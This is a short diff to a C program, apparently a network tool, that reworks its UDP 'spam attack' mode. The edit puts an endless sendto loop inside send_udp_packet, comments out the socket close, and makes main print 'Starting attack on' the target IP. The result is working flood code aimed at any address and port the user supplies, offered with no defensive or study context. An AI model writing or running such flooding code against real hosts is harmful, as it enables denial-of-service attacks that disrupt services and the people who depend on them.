@@ -214,15 +214,14 @@ void send_udp_packet(const char *target_ip, int target_port) {
     dest.sin_family = AF_INET;
     dest.sin_port = htons(target_port);
     dest.sin_addr.s_addr = inet_addr(target_ip);
-
-    // Send the packet
-    if (sendto(sock, message, strlen(message), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
-        perror("Send failed");
-    } else {
-        printf("UDP packet sent to %s:%d\n", target_ip, target_port);
+    while(1){
+        // Send the packet
+        if (sendto(sock, message, strlen(message), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+            perror("Send failed");
+        }
     }
     // Close the socket
-    close(sock);
+    //close(sock);
 }
 
 int check_Pn(int argc,char *argv[])
@@ -581,10 +580,8 @@ int main(int argc,char* argv[])
             int target_port = atoi(argv[3]);;
             printf("In order to stop the spam attack type Ctrl+C\n");
             printf("%d",target_port);
-            while(1)
-            {
-                send_udp_packet(target_ip, target_port);
-            }
+            printf("Starting attack on %s",target_ip);
+            send_udp_packet(target_ip, target_port);
         }
     }
     else if(argc==5)
